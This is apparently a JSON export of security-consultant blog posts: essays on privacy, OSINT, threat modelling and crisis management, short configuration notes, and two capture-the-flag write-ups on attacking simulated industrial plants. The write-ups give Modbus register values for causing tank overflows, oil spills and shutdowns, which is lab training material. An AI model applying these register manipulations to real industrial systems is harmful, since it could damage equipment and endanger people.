ultimate goal is not just to make organizations safer, but also more competitive. Reliability is now a differentiator in the marketplace, and in these times, it can make all the difference.\nSuccessfully surviving a cyber attack is one of the best credentials an organization can show—arguably stronger than simply claiming never to have faced one.\n","cover":"/images/categories/ciso.webp","permalink":"https://www.adainese.it/blog/2021/02/10/crisis-management/","title":"Crisis management"},{"categories":["personal-security"],"contents":"This article was initially drafted about a year ago, but I never published it. Revisiting it now has allowed me to follow up and confirm my initial concerns.\nWe know that nearly every photo we take likely passes through facial recognition software. Apple includes one in its Photos app, and both Google and Facebook have their own versions. Images are associated with people and objects, and can later be retrieved via text-based searches.\nIf you\u0026rsquo;ve never tried it, take a picture of a car license plate with an iPhone and then search for the word \u0026ldquo;plate.\u0026rdquo;\nFor corporations (Google, Apple, etc.), associating descriptive attributes with each photo—including the names of people involved and geolocation—provides immense value for behavioral analysis.\nFor government agencies, as we have seen , being able to link a photo (perhaps from a surveillance camera) with a name and surname is extremely valuable.\nIt is no surprise, therefore, that facial recognition is a subject of significant interest.\nDefeating Facial Recognition Facial recognition relies on algorithms that learn, given a set of images, how to identify a person across different contexts. The more photos are available, the better the algorithm becomes.\nAbout a year ago, Face Shield publicized an application designed to alter photos so that current facial recognition algorithms would fail to detect the people depicted.\nBut since these algorithms continuously improve, such a strategy is only effective temporarily: the more popular the app becomes, the faster countermeasures are developed to adapt recognition systems.\nThe Spread of Personal Photos We have already discussed the risks of sharing personal data . Many services have a business model based on collecting massive datasets of personal, profiled information and reselling them. Clearview.ai is a prime example.\nThe safest recommendation remains: only publish content online that you consciously decide to share—always considering the worst-case scenario if it ends up in the wrong hands.\nFace Shield Face Shield provided a cloud-based app that altered photos to prevent facial recognition algorithms from identifying the people depicted. The tool offered three levels of obfuscation.\nOriginal image:\nSubtle effect: nearly identical to the original but capable of deceiving some recognition software (source: Face Shield website).\nMedium effect: visually different from the original, fooling several recognition systems.\nIntense effect: unrecognizable to both humans and recognition software.\nKey Questions Before using any service, we should start asking the right questions. Face Shield is a perfect example.\nWhere is the company based?\nIt was headquartered in Canada—outside the EU and therefore beyond the reach of GDPR.\nIs there a privacy policy?\nNo. While a privacy policy does not guarantee compliance (as discussed here ), its absence suggests a lack of consideration for user rights.\nWhat is the business model?\nEvery company needs a sustainable business model. In this case, the application was free, with no revenue stream. The only plausible model was data collection and the eventual sale of the company.\nIs the service useful?\nDoes it make sense to render people in photos unrecognizable—thereby degrading the images—only to then share those altered photos on social media?\nIs the service effective?\nIn an ongoing arms race, will adding noise to photos plausibly keep them unrecognizable to facial recognition algorithms? Short term, maybe. Long term, certainly not.\nIf tools such as Depix can recover censored (pixelated) passwords, it is not difficult to imagine similar countermeasures being developed against Face Shield.\nWhat Happened Next As mentioned, this article was written in April 2020 but never published. Revisiting it now, I found that Face Shield no longer exists.\nIts author announced on Twitter :\nPhD Candidate @rllabmcgill/@Mila_Quebec Deep Learning SwissArmy Knife: CV, NLP, Graphs, Gen. Models. http://FaceShield.ai (acquired), Ex-@UberAILabs,@BorealisAI,@UofT\nWe do not know who acquired Face Shield, but it is safe to assume the buyer obtained its software, algorithms, and potentially personal data. Under European law, such data would belong to the users; under U.S. law, it typically belongs to the company that collected it—largely free to use as it pleases.\nConclusions Face Shield is a perfect case study to reflect on the lifecycle of many startups, their business models, and the degree of caution we should exercise before entrusting them with our personal data.\nThe key takeaway: before joining any service, always ask yourself:\nWho operates it, where are they based, and what is their business model (follow the money)? Does it truly solve a problem, or is it creating one? Is the proposed solution effective? What alternatives exist once the service disappears? ","cover":"/blog/2021/02/04/ingannare-il-riconoscimento-facciale/faceshield-intense.webp","permalink":"https://www.adainese.it/blog/2021/02/04/ingannare-il-riconoscimento-facciale/","title":"Ingannare il riconoscimento facciale"},{"categories":["personal-security"],"contents":"I would like to open this article with a quote from the Italian Data Protection Authority, which is also the title of a video :\nData protection is a fundamental right of freedom.\nLet us now reflect on the concept of personal data. Personal means something that belongs to us, and whose ownership cannot be transferred. In fact, under the GDPR, we can grant third parties the right to use our personal data, but at any time we retain the right to request its deletion from those to whom we have granted such usage.\nIt is often said that:\nThe vast amount of personal data that users pour onto the Internet every day is the new oil. {Andrew Keen}\nSome services even suggest that we could directly profit from our personal data instead of leaving all the gains to multinational corporations.\nLet us analyze why \u0026ldquo;renting\u0026rdquo; out our personal data does not work, why it must not work, and why we should be more cautious.\nWhy It Doesn\u0026rsquo;t Work Consider Facebook—not to single it out, but simply to make the example concrete.\nFacebook\u0026rsquo;s revenue in 2019 was $16,886,000,000:\nThis is an enormous figure, and clearly driven by the monetization of user data. The idea that users should share in this profit is appealing. However, there is a problem: Facebook\u0026rsquo;s active user base is also enormous.\nDividing revenue by the number of active users reveals that the value of each individual user is less than $10 per year. Certainly not life-changing.\nWe might assume that providing higher-quality data would increase this value. For example, we could supply Facebook with our geolocation, smartwatch data, link all our accounts, export browsing history, participate in every survey—and perhaps we would earn slightly more.\nBut it still wouldn\u0026rsquo;t change our lives.\nAnd, truthfully, Facebook would not be affected if we deleted our account, updated our profile, or not. We are just a drop in an ocean of 2 billion monthly active users.\nWhy It Must Not Work Facebook states that it profiles users to improve their experience by:\nshowing news more aligned with their interests, promoting products more relevant to their needs. In reality, Facebook monetizes the ability to precisely target audiences with news and advertisements.\nNow, suppose users began sharing more in Facebook\u0026rsquo;s profits. To pay us more, Facebook would need to generate greater value by offering new services. For example, if I were an influencer, I might promote a fashion brand suggested to me by Facebook. Facebook could then sell this influence to major fashion companies.\nThe more unconsciously I adopt Facebook\u0026rsquo;s suggestions, the more effective they are. The more people I manage to influence, the more profitable I become. In short, Facebook could begin shaping my behavior—and that of my network—reselling this capacity as a new form of advertising. The more complete and high-quality my data, the more powerful this influence becomes.\nTo increase user payouts, platforms must also increase their own revenue. Clearly, they could not pay all users equally, but would instead trigger a competition where users are incentivized to provide higher-quality data than others. This would allow platforms to reward a small subset of loyal users while gaining greater power to manipulate the majority.\n\u0026ldquo;I Can Quit Anytime\u0026rdquo; Joining a social network is like smoking: many smokers claim they can quit anytime, yet they rarely do. And smoking leaves lasting traces in the body, which may resurface years later.\nFor many, social media use is the same: a release valve into a parallel reality, curated with tailored content. We believe we are in control, exercising free will, yet day by day we are subjected to increasingly powerful manipulation.\nTrue free will can only be exercised when one is capable of resisting the emotions triggered by posts specifically selected to distort perception.\nScience fiction? Hardly. Facebook has been known to manipulate—or assist in manipulating—public opinion by:\nconducting social experiments that influenced the emotions of nearly 700,000 users ( Facebook apologises for psychological experiments on users ), interfering in political processes such as Brexit and the 2016 U.S. election ( The Great Hack ). And yet, years later, little has been done.\nEven if we delete our accounts, Facebook will erase our data, posts, and activities—but it will never erase the models derived from that data. The GDPR protects personal data, but not the derived insights. Thus, the behavioral models—built on our preferences and actions—remain.\nMoreover, research has shown ( NYT report ) that even a few simple attributes can re-identify individuals with 99.98% accuracy.\nWhy All This Is Allowed As stated earlier, data is the new oil. The reason should now be clear, but there is another dimension: large platforms are potential instruments of social control. Governments—particularly the U.S., where most platforms are based—are eager to exploit such powerful tools under the pretext of ensuring security.\nClearview.ai is a company that scraped billions of photos from social networks to build a massive database. By submitting a photo to Clearview, the system, through facial recognition , returns all matching photos of that person along with their sources.\nUnsurprisingly, Clearview\u0026rsquo;s first clients include U.S. government agencies such as the FBI and DHS.\nMany people, when it comes to privacy, casually claim to \u0026ldquo;have nothing to hide.\u0026rdquo; Yet, no one would be comfortable being part of a massive global mugshot database.\nLet\u0026rsquo;s be clear: Clearview.ai is illegal because it stole user photos entrusted to social networks. In Europe, it also violates multiple GDPR provisions.\nAnd yet, Clearview.ai remains operational, serving government entities worldwide—including in Europe. Remember the strict filters used to censor websites with copyrighted content? Clearly, there is no interest in blocking Clearview\u0026rsquo;s services.\nConclusion Renting out one\u0026rsquo;s personal data in exchange for money is equivalent to prostitution: you are selling far more than just \u0026ldquo;data,\u0026rdquo; and receiving only a few coins in return. The use of any digital tool or service must be approached with full awareness of the mechanisms at play:\nWe must treat personal digital data with the same care and respect as weapons-grade plutonium. It is dangerous, long-lasting, and once leaked, it can never be recovered. {Cory Doctorow}\n","cover":"/blog/2021/01/28/monetizing-personal-data-the-new-form-of-prostitution/facebook-revenue.webp","permalink":"https://www.adainese.it/blog/2021/01/28/monetizing-personal-data-the-new-form-of-prostitution/","title":"Monetizing personal data: the new form of prostitution"},{"categories":["ciso"],"contents":"The recent case of MyFreeCams gave me the perfect example to explain to top management why digital security of individuals should be addressed across all levels of an organization. Their data breach had both reputational and digital security impacts. MyFreeCams here is used only as an example.\nThe Case MyFreeCams, an adult chat service, suffered a data breach : 2 million accounts were exfiltrated. The stolen data included usernames, email addresses, and plain-text passwords.\nOnce again, we see how often online services lack even the most basic security measures, and how these failures directly threaten users.\nThreat Modeling When I deliver training on personal digital security, I hope that threat modeling becomes second nature: before signing up for and using a new service, people should pause and reflect on how it might become a risk. With time, users start to see the many facets of each platform.\nLooking back, let\u0026rsquo;s analyze how the MyFreeCams breach could directly impact individuals.\nIdentity Theft Many people still reuse the same password across multiple accounts. With username, email, and password exposed, attackers can try to log in to other services—email, social media, e-commerce, and more.\nThey can even lock the user out of their account (identity theft) by resetting credentials.\nLarger providers (like Google) often detect suspicious activity and block unusual access attempts. Smaller platforms, however, usually lack such safeguards.\nBlackmail In this case, MyFreeCams provides adult video chat services. The exposure of user data could damage reputations. It\u0026rsquo;s highly likely that some users will receive blackmail emails: pay up, or your use of the service will be revealed.\nThis isn\u0026rsquo;t new. Back in 2015, the dating service Ashley Madison suffered a breach exposing 32 million users—including 15,000 government and military employees who then received extortion attempts.\nAnd blackmail doesn\u0026rsquo;t always mean money. Sometimes the demand is for a certain action—or inaction.\nHow to Respond (After the Fact) Of course, defenses should be planned in advance, but we also need to know how to react when the damage is done. Let\u0026rsquo;s take two likely threats from the MyFreeCams breach:\nidentity theft due to password reuse; blackmail aimed at harming reputation. The first is easier to fix: change every account that used the same password, replacing it with a secure, unique, non-predictable one.\nThe second is more complex and sensitive: if you face blackmail, the first step should be contacting law enforcement. Never negotiate with criminals whose only goal is to make money.\nConclusions Personal digital security is one of my main concerns, whether I\u0026rsquo;m speaking to young people or to adults. And it\u0026rsquo;s critical in business, too. If the infrastructure is strong, it\u0026rsquo;s far easier for attackers to target people than to break hardened defenses. Attacks on individuals\u0026rsquo; reputations can spill over into the company—especially when the targets are key figures.\nThat\u0026rsquo;s why awareness must start at the top. I believe digital security culture should be a central part of everyone\u0026rsquo;s life—both private and professional. If people learn to navigate technology responsibly at home, they\u0026rsquo;ll bring that awareness into the workplace, creating huge benefits.\nSimply delivering corporate video courses on cybersecurity, GDPR, spam, or phishing is not enough. Without context and real-life relevance, those concepts remain sterile, with little value, usefulness, or impact.\n","cover":"/images/categories/ciso.webp","permalink":"https://www.adainese.it/blog/2021/01/25/top-management-security/","title":"Top management security"},{"categories":["personal-security"],"contents":"Every time we use a technological tool (smartphone, computer, and beyond), we disseminate—whether intentionally or not—an enormous amount of information. Very few people actually stop to consider the potential consequences of this behavior.\nMany continue to claim \u0026ldquo;I have nothing to hide\u0026rdquo;, an argument that always reminds me of the image of an ostrich burying its head in the sand.\nInformation Dissemination vs. Information Communication As a preliminary note, and for the purposes of this article, we will use \u0026ldquo;information communication\u0026rdquo; to describe actions where the confidentiality of the channel is implied (e.g., a direct message). Conversely, \u0026ldquo;information dissemination\u0026rdquo; refers to actions where the public nature of the channel is implicit (e.g., a public feed or bulletin board). In both cases, the action is voluntary.\nI often find myself reflecting with others on how the use of technology frequently leads to misperceptions. While posting a status update on a social network clearly implies that it will be visible to others, few are fully aware that this content can be accessed by anyone in the world, from now on, potentially forever.\nThis lack of awareness can be attributed to a persistent misperception: when interacting with a social network, I am likely sitting safely at home or in an office, perhaps even alone. In reality, however, I am standing before a vast, crowded audience of potentially billions of people—and not just people. I am also subject to automated systems (bots, crawlers, scrapers) eagerly collecting my data. These entities simply have no equivalent in the physical world, making it difficult for us to be cautious about something we cannot fully comprehend.\nAnother misperception involves communications assumed to be private: it is evident how easy it is to make \u0026ldquo;confidential\u0026rdquo; information public. Yet when we digitally communicate with someone, we rarely pause to consider this risk.\nData Misappropriation It is crucial to emphasize that everything made public online becomes a potential target for automated tools designed to collect and archive data. These datasets are then monetized—sold or leased to customers.\nIn other words, anything we make accessible can be commodified. The most well-known example is personalized advertising, which requires millions of categorized user profiles. But emerging products raise additional concerns, such as Clearview AI, which has built a massive facial-recognition database from publicly available images (including social media content), offered for lease to federal agencies.\nWith high probability, most of us are already catalogued.\nIn the near future, such databases may become commercially accessible. Anyone with a photo of a person could retrieve correlated information: other images, blog posts, social profiles\u0026hellip; and this data is likely stored indefinitely.\nA stalker\u0026rsquo;s paradise.\nThreat Modeling This leads to the central issue: how can the information I communicate or disseminate become a threat to me, my family, or my organization?\nIt is evident that someone with access to my history, comments, or opinions could selectively weaponize messages to discredit me in any context.\nLikewise, a data breach—such as the one involving Ho Mobile—enables identity theft by anyone with minimal technical knowledge.\nThe more data a potential attacker gathers, the more sophisticated the fraud attempts will become. Thinking \u0026ldquo;why would anyone target me?\u0026rdquo; is once again burying one\u0026rsquo;s head in the sand. Cyber fraud is, in most cases, a business model designed to maximize profit with minimal effort. The profit derives, once again, from what I can provide, often under coercion. That \u0026ldquo;provision\u0026rdquo; may take the form of money, but also of actions or omissions: exfiltrating corporate projects, installing a device within a company network, or overlooking an investigation.\nDefensive Measures The solution lies in strengthening our awareness while reducing the trail of personal information we leave behind.\nIn Zanshin Tech training sessions, a practical exercise highlights the importance of personal data: each participant receives physical cards, each representing a specific type of information (nickname, profile photo, full name, address, religion, sexual orientation, health conditions, intimate images, etc.). The exercise simulates a digital conversation through the exchange of cards. The key insight is clear: once a card is handed over, the original owner loses control, and the recipient can do with it as they wish.\nPersonally, I recommend a simple rule of thumb before sharing any piece of information: if it could be publicly posted in a town square, then it may be communicated or published. Otherwise, it should not. I apply this principle universally—to private messages, emails, and public posts alike.\nConclusion This article aims to establish a baseline of awareness around the actions modern technologies have made so effortless: writing, communicating, sharing, expressing opinions, judgments, and emotions.\nBeyond reflecting on what to share, with whom, where, and how, I encourage everyone to first ask \u0026ldquo;should I share this at all?\u0026rdquo;. The resulting self-awareness will lead us to better understand the underlying impulse that drives us to share, to participate in a digital community that is vastly different from its physical counterpart. That very impulse, which we reveal every time we post, is—especially to those reading between the lines, extremely valuable information.\n","cover":"/blog/2021/01/20/the-dangers-of-unwitting-sharing/mugshot.webp","permalink":"https://www.adainese.it/blog/2021/01/20/the-dangers-of-unwitting-sharing/","title":"The dangers of unwitting sharing"},{"categories":["personal-security"],"contents":"Disclaimer: this article replaces the one I had originally planned, because I noticed something important that caught my attention. Despite the title, this is not about privacy. If you landed here attracted by the title, at least read the conclusions at the end.\nAs you probably know, WhatsApp has recently updated its privacy policy. The news triggered a massive exodus of users towards alternative messaging apps. Bad idea—really bad.\nPrivacy Policy A privacy policy is supposed to explain how a service processes personal data—especially in Europe, where GDPR applies. I say \u0026ldquo;supposed to\u0026rdquo; because the reality is often more complex.\nTo me, the privacy policy is a litmus test of how much a company truly cares about data protection. Medium-to-large companies, offering multiple services, should update their policies often: laws change, technologies evolve, partnerships shift, and services (hopefully) become safer and more user-friendly over time.\nWhatsApp has updated its privacy policy several times , in 2016, 2019, 2020, and again in 2021. For European users, nothing dramatically new has changed. If you want to dive deeper into the legal side, I suggest Altroconsumo , Cybersecurity360 , and Agenda Digitale .\nOne crucial point, though: WhatsApp falls under U.S. surveillance laws and therefore must grant access to personal data—even of non-U.S. citizens—regardless of where that data is stored. This has always been true. Nothing has changed.\nFinally, based on my experience, privacy policies never fully reflect reality. Processes are often undocumented, details omitted, mistakes left in. The bigger the company, the bigger the gap. That\u0026rsquo;s why I call them litmus tests: if a company cares about data, processes and technologies evolve, and so should their privacy policies.\nManipulation of People Here\u0026rsquo;s the real issue.\nAs I said, little has changed. WhatsApp was subject to U.S. surveillance law before, and it still is. If that was a problem today, it was already a problem last month.\nAnd yet, a huge number of people uninstalled WhatsApp and moved to Signal or Telegram—not based on facts, but on an emotional wave of fear, amplified by media noise and viral social posts. This is THE PROBLEM.\nI personally received messages full of false claims, with no references or sources—crafted solely to spread fear. Classic fake news. And fake news has a dual purpose: it manipulates emotions, and it censors dialogue (by shutting down critical thinking).\nThis fear-driven messaging successfully convinced millions of people to take action without asking themselves if it made sense. That\u0026rsquo;s manipulation, not choice.\nAs Pavel Durov shared, Telegram gained 25 million users in just 72 hours. 27% were Europeans—6.7 million people switching platforms in three days, not out of rational analysis, but because of emotional contagion.\nFree Will A wise teacher once said: given an event, free will lies in choosing the emotion with which we respond to it. The obvious consequence: if I can manipulate your emotions around an event, you\u0026rsquo;ll believe you\u0026rsquo;re choosing freely, while in reality you\u0026rsquo;re acting exactly as I designed.\nIf we binge-watch a fearmongering video and let emotions drive our decisions, free will disappears.\nThreat Modeling This is the real threat we should worry about: the manipulation of our perception.\nBefore rushing into a new messaging app, we need to ask ourselves: who am I entrusting my information to, and what kind of data are they really collecting?\nIf you\u0026rsquo;ve never done such an exercise, try now:\nList the threats of using WhatsApp. Rank them by severity. Then decide if switching makes sense—and to what. Only then should you look at resources like this messaging comparison table .\nPrivacy Protection If your concern is broader—the constant surveillance by almost any online service—brace yourself. It\u0026rsquo;s a long, steep road. And no, deleting a single app won\u0026rsquo;t solve it. But we\u0026rsquo;ll have the chance to discuss that another time.\nConclusions For European users, nothing substantial has changed with WhatsApp\u0026rsquo;s privacy policy. If privacy is the issue—it was already there. If trust is the issue—it was already broken.\nBut that\u0026rsquo;s not the point.\nI deliberately used current news, a sensitive topic, and a catchy title to grab your attention—just like the manipulation I described. The difference is that my goal was to make you aware of the mechanism.\nTwo kinds of readers may have landed here:\nRegular followers (thank you): I hope you still found a fresh perspective. Worried WhatsApp users: I hope this helped you see how easily fear can drive actions, and why structured thinking—like threat modeling—is the real defense. Greater awareness and critical thinking don\u0026rsquo;t just make individuals safer—they also strengthen companies and digital ecosystems.\n","cover":"/images/categories/personal-security.webp","permalink":"https://www.adainese.it/blog/2021/01/13/privacy-policy-and-non-existent-free-will/","title":"Privacy policy and non existent free will"},{"categories":["personal-security"],"contents":"As human beings, due to our evolutionary background, we struggle to perceive the dangers of the digital world. We have always been accustomed to assessing risk based on our physical environment, evaluating the context (location, people, etc.). For example, walking through a dark, deserted alley at night, we would likely feel a sense of heightened alertness combined with anxiety. These emotions are essential in triggering a flight response in case of a threat.\nThis sense of vigilance is generally absent when using computers and smartphones. Often, this is because we use such devices in safe locations, such as our homes, offices, or crowded waiting rooms. No one would typically use a social network in a potentially dangerous situation if the danger were perceived as such.\nHowever, we fail to fully grasp that if the Internet connects us to the world, the world is also connected to us, with all its consequences. This results in a misperception of danger when using digital tools.\nPersonal Digital Protection We are used to thinking that certain individuals (politicians, industrial leaders) require physical protection through armed guards and armored vehicles. However, we rarely consider the necessity of protecting these individuals from a digital perspective. This is not merely a matter of understanding a specific technology but rather adopting a security-oriented mindset.\nConsider two well-known cases: Boris Johnson (former British Prime Minister) and Ank Bijleveld (former Dutch Minister of Defense). Both inadvertently exposed access credentials to confidential meetings. Many colleagues commented harshly on these incidents, but the problem is more complex than it seems: we need to educate people on understanding a world that, until recently, posed no significant threats. We must build awareness to mitigate potential damage. I say \u0026ldquo;mitigate\u0026rdquo; because damage has already occurred, and, even if we start today, many more incidents will happen before we reach a sufficient number of informed individuals capable of minimizing these risks.\nWe must focus on:\nC-Level executives, politicians, and key personnel in national and corporate environments who are potential targets for attacks against critical infrastructure. Adults, both as individuals and employees, who are susceptible to digital attacks, scams, and phishing, potentially becoming entry points for corporate breaches. Children and teenagers, who are often given technological tools without adequate education on digital threats and self-protection. A Case Study Several months ago, I came across a job listing from an international company (which will remain anonymous) looking for a CISO. The position was interesting, and before considering it seriously, I wanted to assess the company\u0026rsquo;s security awareness. I conducted an OSINT (Open Source Intelligence) analysis to identify potential vulnerabilities.\nFor those unfamiliar with OSINT, it refers to the practice of gathering publicly available data. It is comparable to research conducted in a public library.\nNo hacking or intrusion was performed, yet due to the careless handling of information, I made some surprising discoveries. Specifically, I found personal details of the CEO, including their private email, personal phone number, and home address.\nThese details were accessible via the company\u0026rsquo;s website, embedded in corporate documents from previous years, likely submitted for certification purposes and never removed. Search engines then indexed this information, making it publicly searchable, just like a library catalog.\nThreat Modeling The threat modeling activity involves hypothesizing the threats to which I am exposed or expose myself by performing or not performing a specific action. For example, if I provide my personal mobile phone number to someone who asks for it during a conference, I am aware that this number can potentially be disseminated without limitation. As a result, I might, for instance, receive WhatsApp messages from unknown individuals and will need to assess any interactions with this awareness.\nIn the scenario described above, making one\u0026rsquo;s private contact details public exposes the individual to both digital attacks (via email and phone number) and physical attacks (via home address), potentially opening the door to stalkers. Moreover, since the individual holds a highly significant role within the company, they could become the ideal target for accessing sensitive corporate information, such as bank accounts, commercial data, patents, and more.\nConclusion While this article may seem alarmist, denying reality does not make it disappear. The issue is real and widespread across all sectors (corporate, personal, and youth). We must first acknowledge that we all face digital security challenges and learn how to manage them effectively.\nThe tools exist; we need to learn how to use them correctly. The best way to do so is by applying time-tested principles: we must train ourselves to recognize and mitigate digital threats, just as we did with traditional security threats before the Internet became widely accessible.\nParents of today\u0026rsquo;s middle-aged adults often advised against talking to strangers. We need to translate that mindset into the digital world, where we are all cons\n","cover":"/images/categories/personal-security.webp","permalink":"https://www.adainese.it/blog/2021/01/04/personal-digital-protection/","title":"Personal digital protection"},{"categories":["notes"],"contents":"To properly configure a Pi Zero W headless (without monitor and keyboard), burn a Raspberry OS (Raspbian) image into a SD card.\nInsert the SD card again and browse the first partition where config.txt file is located:\nadd an empty file named ssh to start SSH daemon on boot; add another file named wpa_supplicant.conf with the following content (replace country, ssid and psk): country=IT ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev update_config=1 network={ ssid=\u0026#34;NETWORK-NAME\u0026#34; psk=\u0026#34;NETWORK-PASSWORD\u0026#34; } ","cover":"/images/vendors/raspberry.webp","permalink":"https://www.adainese.it/blog/2021/01/03/pi-zero-w-headless-setup/","title":"Pi Zero W headless setup"},{"categories":["writeup","ot-ics","security"],"contents":"This post explore my second TryHackMe room: Attacking ICS Plant #2 . Because the VM can be unresponsive, I also provide the OVA for offline labs.\nThe room allows attacking a simulated refinery plant, gaining basic knowledge on ICS protocol weakness.\nTask 1 The Attacking ICS Plant #1 room (get the offline version) is a prerequisite: complete it and download example scripts from there.\nThe first task requires understanding how the plant works. Use the discovery.py script and see how registries change.\nWe can observe:\nwhen the feed pump is filling the oil storage unit, registry 1 = 1 (PLC_FEED_PUMP); when the oil storage unit is full, registry 2 = 1 (PLC_TANK_LEVEL); when oil flows to through the outlet valve, registry 3 = 1 (PLC_OUTLET_VALVE); when the water flows out, registry 8 = 1 (PLC_WASTE_VALVE) and registry 6 increases (PLC_OIL_SPILL); when the oil flows out, registry 4 = 1 (PLC_SEP_VALVE) and registry 7 increases (PLC_OIL_PROCESSED); Task 2 The solution requires opening the feed pump while maintaining closed the outlet valve:\nregistry 1 = 1 (PLC_FEED_PUMP) registry 3 = 0 (PLC_OUTLET_VALVE) Modify an attack script and run it. After 60 seconds, get the flag1: http://MACHINE_IP/flag1.txt.\nNote: reset the plant by pressing the ESC button before starting the attack.\nTask 3 The solution requires opening the feed pump, the outlet valve, and the separator vessel valve while maintaining closed the wastewater valve:\nregistry 1 = 1 (PLC_FEED_PUMP) registry 3 = 1 (PLC_OUTLET_VALVE) registry 4 = 1 (PLC_SEP_VALVE) registry 8 = 0 (PLC_WASTE_VALVE) Modify an attack script and run it. After reaching registry 7 \u0026gt; 1000 while registry 6 \u0026lt; 2, get the flag2: http://MACHINE_IP/flag2.txt.\n","cover":"/blog/2020/12/24/write-up-attacking-ics-plant-2/plant.webp","permalink":"https://www.adainese.it/blog/2020/12/24/write-up-attacking-ics-plant-2/","title":"Write-up Attacking ICS Plant 2"},{"categories":["writeup","ot-ics","security"],"contents":"This post explore my first TryHackMe room: Attacking ICS Plant #1 . Because the VM can be unresponsive, I also provide the OVA for offline labs.\nThe room allows exploration of a simulated bottle-filling plant, gaining basic knowledge on ICS protocol weakness.\nNote: VirtuaPlant can be downloaded from GitHub . The VM is based on Debian 8, and it\u0026rsquo;s configured by DHCP. I added additional scripts to simulate plant personnel. No SSH password is required, so I don\u0026rsquo;t provide it.\nTask 1: Introduction to OT/ICS Read and understand that:\nindustries are managed by sophisticated, mission-critical computers (SCADA systems); security is not the priority in OT/ICS; operators can manually override the behavior of the plant via mouse/keyboard/touchscreen, locally or remotely; malicious software can override the behavior of the plant-like HMI does. Task 2: Introduction to Modbus protocol Read and understand how the Modbus protocol works.\nTo properly continue the lab, download an install pymodbus Python3 module:\npip3 install pymodbus==1.5.2 Then download, unpack and analyze the attached scripts.\nThe script discovery.py is used to understand how the plant is working, therefore it contains the answer to the first question.\nThe script set_registry.py is used to set a custom value to a single register, therefore it contains the answer to the second question.\nTask 3: Discovery Before attacking a plant we need to understand how it works. Deploy the VM and connect using a browser to it using HTTP. Mind that pressing the ESC button on the browser will restart the plant.\nWe can see the following phases (1st answer):\nInitialization: the plant is starting from the beginning. The roller moves the first bottle under the nozzle. Filling: once a bottle is under the nozzle, the nozzle opens and the water flows in the bottle. Moving: once the bottle is filled, the roller starts again moving the next empty bottle under the nozzle. Looking how the plant is working, we can see two sensors (2nd answer) and three actuators (3rd answer):\nwater level sensor is red (11th answer) bottle position sensor is green (12th answer) actuator to start/stop the plant actuator to open/close the nozzle actuator to start/stop the roller Now we need to detect which registries are controlling sensors and actuators. Start the script discovery.py and restart the plant (pressing the ESC button).\nThe plant is using a 16bit long (4th answer) holding register, which allows sixteen binary values (6th and 7th answers), but only 5 registries are used.\nLet\u0026rsquo;s check which bits are changing their values in each phase:\nInitialization: registry 3 = 1, registry 16 = 1 (8th answer) Filling: registry 2 = 1, registry 4 = 1 (9th answer) Moving: registry 1 = 1, registry 3 = 1 (10th answer) Four (5th answer) registries are continuously changing their values once the plant is initialized.\nBecause the roller is moving in phases 1 and 3, while it\u0026rsquo;s stopped in phase 2, the registry 3 (13th answer) is the only one that can be associated with the roller:\nInitialization: roller is on (registry 3 = 1) Filling: roller is off (registry 3 = 0) Moving: roller is on (registry 3 = 1) In phase 3 the roller is off until the bottle is filled: we can deduce that the water level sensor is associated with registry 1.\nWe can also deduce that actuator to start/stop the plant is associated with registry 16.\nLet\u0026rsquo;s recap:\nThree phases: Initialization: once the plant is started, the roller is on waiting for the first bottle. Filling: once a bottle is under the nozzle, the nozzle opens and the water flows in the bottle. Moving: once the bottle is filled, the roller starts again moving the next empty bottle under the nozzle. Actuators: Start/stop the plant: registry 16. Start/stop the roller: registry 3. Open/close the nozzle: registry 2 or 4. We need to spend additional time on that. Sensors: water level: registry 1 (red sensor) bottle position: registry 2 or 4 (green sensor). We need to spend additional time on that. Task 4: Play to learn Using the script set_registry.py we can play with registries 2 and 4 forcing a specific value. After a while, we can realize that nozzle is associated with registry 4 (1st answer) and we can deduce that the bottle position sensor is associated with registry 2.\nWe finally figured out how the plant works describing all changing registries:\nRegistry 1: associated with the bottle sensor. Value is 1 if the bottle is under the nozzle. Registry 2: associated with the water level sensor. Value is 1 if the bottle is filled. Registry 3: associated with the roller actuators. Value 1 turns the roller on. Registry 4: associated with the nozzle. Value 1 opens the nozzle. Registry 16: associated with the plant. Value 1 starts the plant Task 5: Attack Because the Modbus protocol is a clear-text unauthenticated protocol, and the registries are writable by anyone, we can alter how the plans is working by abusing its registries:\nForce registry 16 = 0 to stop the plant. Force also registry 3 = 0 to stop the roller and registry 4 = 0 to close the nozzle (script attack_shutdown.py answers the 1st question, script attack_shutdown2.py improves the attack and answers the 4th question). Force registry 16 = 1 to start the plant. Force registry 3 = 1 to start the roller and registry 4 = 1 to leave the nozzle open (script attack_move_fill.py answers the 2nd question, script attack_move_fill2.py improves the attack and answers the 5th question). Force registry 16 = 1 to start the plant. Force registry 3 = 0 to stop the roller and registry 4 = 1 to leave the nozzle open (script attack_stop_fill.py answers the 3rd question, script attack_stop_fill2.py improves the attack and answers the 6th question). ","cover":"/blog/2020/12/02/write-up-attacking-ics-plant-1/plant.webp","permalink":"https://www.adainese.it/blog/2020/12/02/write-up-attacking-ics-plant-1/","title":"Write-up Attacking ICS Plant 1"},{"categories":["automation","notes"],"contents":"On some Ansible designs, I need to use a bastion host to log in to remote servers. We can configure it in the following way:\non ansible.cfg file:\n[defaults] timeout = 25 gathering = smart # utile ma non essenziale [ssh_connection] #ssh_args = -o ControlMaster=auto -o ControlPersist=600s ssh_args = -o ControlMaster=auto -o ControlPersist=600s -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=nocontrol_path = %(directory)s/%%h-%%r pipelining = True on the inventory file:\nvars: ansible_ssh_common_args: \u0026#39;-o ProxyCommand=\u0026#34;sshpass -p passwordcomplessa ssh -W %h:%p -q remoteuser@bastionhost\u0026#34;\u0026#39; Additional notes:\nPasswords sent through sshpass are visible to all users using ps -a command. Prefer key authentication with the bastion host. ","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2020/08/14/ansible-with-a-bastion-host-ssh-proxy/","title":"Ansible with a bastion host (SSH Proxy)"},{"categories":["automation","notes"],"contents":"On large Linux Debian installations, I usually configure an APT proxy to optimize upgrades. I\u0026rsquo;m used to configuring APT-Cached NG in the following way:\non /etc/apt-cacher-ng/acng.conf file:\nCacheDir: /proxydata/cache/apt-cacher-ng LogDir: /var/log/apt-cacher-ng SupportDir: /usr/lib/apt-cacher-ng Port:3142 Remap-debrep: file:deb_mirror*.gz /debian ; file:backends_debian # Debian Archives Remap-uburep: file:ubuntu_mirrors /ubuntu ; file:backends_ubuntu # Ubuntu Archives Remap-secdeb: security.debian.org ; security.debian.org 